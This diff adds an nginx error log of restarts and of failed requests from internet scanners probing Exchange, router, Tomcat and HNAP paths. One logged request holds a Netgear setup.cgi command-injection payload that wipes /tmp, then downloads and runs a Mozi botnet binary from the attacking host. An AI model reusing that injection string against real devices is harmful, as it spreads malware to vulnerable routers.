@@ -1,0 +1,706 @@
+2021/08/10 13:23:56 [notice] 1#1: using the "epoll" event method
+2021/08/10 13:23:56 [notice] 1#1: nginx/1.21.1
+2021/08/10 13:23:56 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/10 13:23:56 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/10 13:23:56 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/10 13:23:56 [notice] 1#1: start worker processes
+2021/08/10 13:23:56 [notice] 1#1: start worker process 24
+2021/08/10 13:23:56 [notice] 1#1: start worker process 25
+2021/08/10 13:23:59 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:23:59 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:00 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:00 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:00 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:00 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:00 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:00 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:01 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:01 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:01 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:01 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:01 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:04 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:05 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:05 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:05 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:05 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:24:06 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:26:11 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/10 13:26:11 [notice] 24#24: gracefully shutting down
+2021/08/10 13:26:11 [notice] 24#24: exiting
+2021/08/10 13:26:11 [notice] 24#24: exit
+2021/08/10 13:26:11 [notice] 25#25: gracefully shutting down
+2021/08/10 13:26:11 [notice] 25#25: exiting
+2021/08/10 13:26:11 [notice] 25#25: exit
+2021/08/10 13:26:11 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/10 13:26:11 [notice] 1#1: worker process 24 exited with code 0
+2021/08/10 13:26:11 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/10 13:26:11 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2021/08/10 13:26:11 [notice] 1#1: worker process 25 exited with code 0
+2021/08/10 13:26:11 [notice] 1#1: exit
+2021/08/10 13:26:13 [notice] 1#1: using the "epoll" event method
+2021/08/10 13:26:13 [notice] 1#1: nginx/1.21.1
+2021/08/10 13:26:13 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/10 13:26:13 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/10 13:26:13 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/10 13:26:13 [notice] 1#1: start worker processes
+2021/08/10 13:26:13 [notice] 1#1: start worker process 24
+2021/08/10 13:26:13 [notice] 1#1: start worker process 25
+2021/08/10 13:26:18 [error] 25#25: *1 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:26:18 [error] 25#25: *3 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:28:35 [error] 25#25: *5 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:28:35 [error] 25#25: *5 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:28:35 [error] 25#25: *5 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:28:35 [error] 25#25: *5 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:28:36 [error] 25#25: *5 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:28:36 [error] 25#25: *5 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:28:36 [error] 25#25: *5 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:28:36 [error] 25#25: *5 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:17 [error] 25#25: *8 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:17 [error] 25#25: *8 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:18 [error] 25#25: *8 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:18 [error] 25#25: *8 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:18 [error] 25#25: *8 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:18 [error] 25#25: *9 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:18 [error] 25#25: *9 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:18 [error] 25#25: *9 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:19 [error] 25#25: *9 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:19 [error] 25#25: *9 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:19 [error] 25#25: *9 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:30:19 [error] 25#25: *9 "/var/www/hello.dev/index.php" is not found (2: No such file or directory), client: 85.143.177.228, server: gate, request: "GET / HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 13:36:16 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/10 13:36:16 [notice] 24#24: gracefully shutting down
+2021/08/10 13:36:16 [notice] 24#24: exiting
+2021/08/10 13:36:16 [notice] 24#24: exit
+2021/08/10 13:36:16 [notice] 25#25: gracefully shutting down
+2021/08/10 13:36:16 [notice] 25#25: exiting
+2021/08/10 13:36:16 [notice] 25#25: exit
+2021/08/10 13:36:16 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/10 13:36:16 [notice] 1#1: worker process 24 exited with code 0
+2021/08/10 13:36:16 [notice] 1#1: worker process 25 exited with code 0
+2021/08/10 13:36:16 [notice] 1#1: exit
+2021/08/10 13:36:28 [notice] 1#1: using the "epoll" event method
+2021/08/10 13:36:28 [notice] 1#1: nginx/1.21.1
+2021/08/10 13:36:28 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/10 13:36:28 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/10 13:36:28 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/10 13:36:28 [notice] 1#1: start worker processes
+2021/08/10 13:36:28 [notice] 1#1: start worker process 23
+2021/08/10 13:36:28 [notice] 1#1: start worker process 24
+2021/08/10 14:41:42 [error] 23#23: *23 open() "/var/www/gate/robots.txt" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /robots.txt HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/10 16:49:05 [error] 23#23: *36 open() "/var/www/gate/owa/auth/x.js" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /owa/auth/x.js HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/10 17:02:10 [error] 23#23: *37 open() "/var/www/gate/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/10 17:13:02 [error] 23#23: *38 open() "/var/www/gate/owa/auth/logon.aspx" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /owa/auth/logon.aspx HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/10 17:42:58 [error] 23#23: *39 open() "/var/www/gate/config/getuser" failed (2: No such file or directory), client: 199.19.224.165, server: gate, request: "GET /config/getuser?index=0 HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 18:21:52 [error] 23#23: *40 open() "/var/www/gate/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.43.209, server: gate, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "84.201.145.127:8080", referrer: "http://84.201.145.127:8080/admin/login.asp"
+2021/08/10 18:34:14 [error] 23#23: *41 open() "/var/www/gate/actuator/health" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /actuator/health HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/10 19:57:35 [error] 23#23: *44 open() "/var/www/gate/setup.cgi" failed (2: No such file or directory), client: 120.85.239.142, server: gate, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.85.239.142:57858/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
+2021/08/10 22:00:01 [error] 23#23: *61 open() "/var/www/gate/config/getuser" failed (2: No such file or directory), client: 212.192.246.80, server: gate, request: "GET /config/getuser?index=0 HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 22:27:35 [error] 23#23: *68 open() "/var/www/gate/ReportServer" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /ReportServer HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/10 22:44:30 [error] 23#23: *77 open() "/var/www/gate/login" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /login HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/10 22:46:39 [error] 23#23: *78 open() "/var/www/gate/config/getuser" failed (2: No such file or directory), client: 199.19.224.165, server: gate, request: "GET /config/getuser?index=0 HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/10 23:05:42 [error] 23#23: *83 open() "/var/www/gate/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/10 23:10:06 [error] 23#23: *84 open() "/var/www/gate/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.43.209, server: gate, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "84.201.145.127:8080", referrer: "http://84.201.145.127:8080/admin/login.asp"
+2021/08/11 01:05:32 [error] 23#23: *100 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080", referrer: "http://84.201.145.127:80/favicon.ico"
+2021/08/11 01:05:33 [error] 23#23: *101 open() "/var/www/gate/favicon.ico" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /favicon.ico HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 09:09:53 [error] 23#23: *132 open() "/var/www/gate/robots.txt" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /robots.txt HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 10:10:51 [error] 23#23: *141 open() "/var/www/gate/owa/auth/logon.aspx" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 10:16:26 [error] 23#23: *142 open() "/var/www/gate/robots.txt" failed (2: No such file or directory), client: 172.19.0.1, server: gate, request: "GET /robots.txt HTTP/1.0", host: "127.0.0.1:8080"
+2021/08/11 10:55:06 [error] 23#23: *143 open() "/var/www/gate/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.43.209, server: gate, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "84.201.145.127:8080", referrer: "http://84.201.145.127:8080/admin/login.asp"
+2021/08/11 11:44:49 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 11:44:49 [notice] 24#24: gracefully shutting down
+2021/08/11 11:44:49 [notice] 24#24: exiting
+2021/08/11 11:44:49 [notice] 24#24: exit
+2021/08/11 11:44:49 [notice] 23#23: gracefully shutting down
+2021/08/11 11:44:49 [notice] 23#23: exiting
+2021/08/11 11:44:49 [notice] 23#23: exit
+2021/08/11 11:44:50 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/11 11:44:50 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 11:44:50 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/11 11:44:50 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 11:44:50 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 11:44:50 [notice] 1#1: exit
+2021/08/11 11:44:51 [notice] 1#1: using the "epoll" event method
+2021/08/11 11:44:51 [notice] 1#1: nginx/1.21.1
+2021/08/11 11:44:51 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 11:44:51 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 11:44:51 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 11:44:51 [notice] 1#1: start worker processes
+2021/08/11 11:44:51 [notice] 1#1: start worker process 23
+2021/08/11 11:44:51 [notice] 1#1: start worker process 24
+2021/08/11 11:45:04 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 11:45:04 [notice] 23#23: gracefully shutting down
+2021/08/11 11:45:04 [notice] 23#23: exiting
+2021/08/11 11:45:04 [notice] 23#23: exit
+2021/08/11 11:45:04 [notice] 24#24: gracefully shutting down
+2021/08/11 11:45:04 [notice] 24#24: exiting
+2021/08/11 11:45:04 [notice] 24#24: exit
+2021/08/11 11:45:04 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/11 11:45:04 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 11:45:04 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 11:45:04 [notice] 1#1: exit
+2021/08/11 11:45:14 [notice] 1#1: using the "epoll" event method
+2021/08/11 11:45:14 [notice] 1#1: nginx/1.21.1
+2021/08/11 11:45:14 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 11:45:14 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 11:45:14 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 11:45:14 [notice] 1#1: start worker processes
+2021/08/11 11:45:14 [notice] 1#1: start worker process 22
+2021/08/11 11:45:14 [notice] 1#1: start worker process 23
+2021/08/11 11:45:34 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 11:45:34 [notice] 22#22: gracefully shutting down
+2021/08/11 11:45:34 [notice] 23#23: gracefully shutting down
+2021/08/11 11:45:34 [notice] 22#22: exiting
+2021/08/11 11:45:34 [notice] 23#23: exiting
+2021/08/11 11:45:34 [notice] 23#23: exit
+2021/08/11 11:45:34 [notice] 22#22: exit
+2021/08/11 11:45:34 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 11:45:34 [notice] 1#1: worker process 22 exited with code 0
+2021/08/11 11:45:34 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 11:45:34 [notice] 1#1: exit
+2021/08/11 11:45:35 [notice] 1#1: using the "epoll" event method
+2021/08/11 11:45:35 [notice] 1#1: nginx/1.21.1
+2021/08/11 11:45:35 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 11:45:35 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 11:45:35 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 11:45:35 [notice] 1#1: start worker processes
+2021/08/11 11:45:35 [notice] 1#1: start worker process 23
+2021/08/11 11:45:35 [notice] 1#1: start worker process 24
+2021/08/11 11:46:00 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 11:46:00 [notice] 23#23: gracefully shutting down
+2021/08/11 11:46:00 [notice] 23#23: exiting
+2021/08/11 11:46:00 [notice] 23#23: exit
+2021/08/11 11:46:00 [notice] 24#24: gracefully shutting down
+2021/08/11 11:46:00 [notice] 24#24: exiting
+2021/08/11 11:46:00 [notice] 24#24: exit
+2021/08/11 11:46:00 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 11:46:00 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 11:46:00 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 11:46:00 [notice] 1#1: exit
+2021/08/11 11:46:01 [notice] 1#1: using the "epoll" event method
+2021/08/11 11:46:01 [notice] 1#1: nginx/1.21.1
+2021/08/11 11:46:01 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 11:46:01 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 11:46:01 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 11:46:01 [notice] 1#1: start worker processes
+2021/08/11 11:46:01 [notice] 1#1: start worker process 23
+2021/08/11 11:46:01 [notice] 1#1: start worker process 24
+2021/08/11 11:46:49 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 11:46:49 [notice] 23#23: gracefully shutting down
+2021/08/11 11:46:49 [notice] 23#23: exiting
+2021/08/11 11:46:49 [notice] 23#23: exit
+2021/08/11 11:46:49 [notice] 24#24: gracefully shutting down
+2021/08/11 11:46:49 [notice] 24#24: exiting
+2021/08/11 11:46:49 [notice] 24#24: exit
+2021/08/11 11:46:49 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/11 11:46:49 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 11:46:49 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/11 11:46:49 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 11:46:49 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 11:46:49 [notice] 1#1: exit
+2021/08/11 11:46:50 [notice] 1#1: using the "epoll" event method
+2021/08/11 11:46:50 [notice] 1#1: nginx/1.21.1
+2021/08/11 11:46:50 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 11:46:50 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 11:46:50 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 11:46:50 [notice] 1#1: start worker processes
+2021/08/11 11:46:50 [notice] 1#1: start worker process 23
+2021/08/11 11:46:50 [notice] 1#1: start worker process 24
+2021/08/11 11:47:31 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 11:47:31 [notice] 24#24: gracefully shutting down
+2021/08/11 11:47:31 [notice] 23#23: gracefully shutting down
+2021/08/11 11:47:31 [notice] 24#24: exiting
+2021/08/11 11:47:31 [notice] 23#23: exiting
+2021/08/11 11:47:31 [notice] 24#24: exit
+2021/08/11 11:47:31 [notice] 23#23: exit
+2021/08/11 11:47:31 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/11 11:47:31 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 11:47:31 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 11:47:31 [notice] 1#1: exit
+2021/08/11 11:47:33 [notice] 1#1: using the "epoll" event method
+2021/08/11 11:47:33 [notice] 1#1: nginx/1.21.1
+2021/08/11 11:47:33 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 11:47:33 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 11:47:33 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 11:47:33 [notice] 1#1: start worker processes
+2021/08/11 11:47:33 [notice] 1#1: start worker process 23
+2021/08/11 11:47:33 [notice] 1#1: start worker process 24
+2021/08/11 11:48:25 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 11:48:25 [notice] 23#23: gracefully shutting down
+2021/08/11 11:48:25 [notice] 24#24: gracefully shutting down
+2021/08/11 11:48:25 [notice] 23#23: exiting
+2021/08/11 11:48:25 [notice] 24#24: exiting
+2021/08/11 11:48:25 [notice] 23#23: exit
+2021/08/11 11:48:25 [notice] 24#24: exit
+2021/08/11 11:48:25 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 11:48:25 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 11:48:25 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/11 11:48:25 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/11 11:48:25 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 11:48:25 [notice] 1#1: exit
+2021/08/11 11:48:27 [notice] 1#1: using the "epoll" event method
+2021/08/11 11:48:27 [notice] 1#1: nginx/1.21.1
+2021/08/11 11:48:27 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 11:48:27 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 11:48:27 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 11:48:27 [notice] 1#1: start worker processes
+2021/08/11 11:48:27 [notice] 1#1: start worker process 23
+2021/08/11 11:48:27 [notice] 1#1: start worker process 24
+2021/08/11 11:55:37 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 11:55:37 [notice] 24#24: gracefully shutting down
+2021/08/11 11:55:37 [notice] 23#23: gracefully shutting down
+2021/08/11 11:55:37 [notice] 24#24: exiting
+2021/08/11 11:55:37 [notice] 23#23: exiting
+2021/08/11 11:55:37 [notice] 24#24: exit
+2021/08/11 11:55:37 [notice] 23#23: exit
+2021/08/11 11:55:37 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 11:55:37 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 11:55:37 [notice] 1#1: signal 29 (SIGIO) received
+2021/08/11 11:55:37 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2021/08/11 11:55:37 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 11:55:37 [notice] 1#1: exit
+2021/08/11 11:55:58 [notice] 1#1: using the "epoll" event method
+2021/08/11 11:55:58 [notice] 1#1: nginx/1.21.1
+2021/08/11 11:55:58 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 11:55:58 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 11:55:58 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 11:55:58 [notice] 1#1: start worker processes
+2021/08/11 11:55:58 [notice] 1#1: start worker process 23
+2021/08/11 11:55:58 [notice] 1#1: start worker process 24
+2021/08/11 12:17:48 [error] 24#24: *42 open() "/var/www/gate/manager/html" failed (2: No such file or directory), client: 42.193.8.97, server: gate, request: "GET /manager/html HTTP/1.1", host: "84.201.145.127:8080"
+2021/08/11 13:13:57 [error] 24#24: *51 open() "/var/www/gate/boaform/admin/formLogin" failed (2: No such file or directory), client: 209.141.43.209, server: gate, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "84.201.145.127:8080", referrer: "http://84.201.145.127:8080/admin/login.asp"
+2021/08/11 14:07:37 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 14:07:37 [notice] 24#24: gracefully shutting down
+2021/08/11 14:07:37 [notice] 24#24: exiting
+2021/08/11 14:07:37 [notice] 24#24: exit
+2021/08/11 14:07:37 [notice] 23#23: gracefully shutting down
+2021/08/11 14:07:37 [notice] 23#23: exiting
+2021/08/11 14:07:37 [notice] 23#23: exit
+2021/08/11 14:07:38 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2021/08/11 14:07:38 [notice] 1#1: worker process 23 exited with code 0
+2021/08/11 14:07:38 [notice] 1#1: worker process 24 exited with code 0
+2021/08/11 14:07:38 [notice] 1#1: exit
+2021/08/11 14:08:18 [notice] 1#1: using the "epoll" event method
+2021/08/11 14:08:18 [notice] 1#1: nginx/1.21.1
+2021/08/11 14:08:18 [notice] 1#1: built by gcc 8.3.0 (Debian 8.3.0-6) 
+2021/08/11 14:08:18 [notice] 1#1: OS: Linux 4.19.0-8-amd64
+2021/08/11 14:08:18 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/08/11 14:08:18 [notice] 1#1: start worker processes
+2021/08/11 14:08:18 [notice] 1#1: start worker process 24
+2021/08/11 14:08:18 [notice] 1#1: start worker process 25
+2021/08/11 14:19:24 [error] 25#25: *32 "/var/www/gate/HNAP1/index.php" is not found (2: No such file or directory), client: 172.21.0.1, server: gate, request: "GET /HNAP1/ HTTP/1.0", host: "127.0.0.1:8080", referrer: "http://84.201.145.127/"
+2021/08/11 14:34:34 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/08/11 14:34:34 [notice] 24#24: gracefully shutting down
+2021/08/11 14:34:34 [notice] 25#25: gracefully shutting down
+2021/08/11 14:34:34 [notice] 24#24: exiting
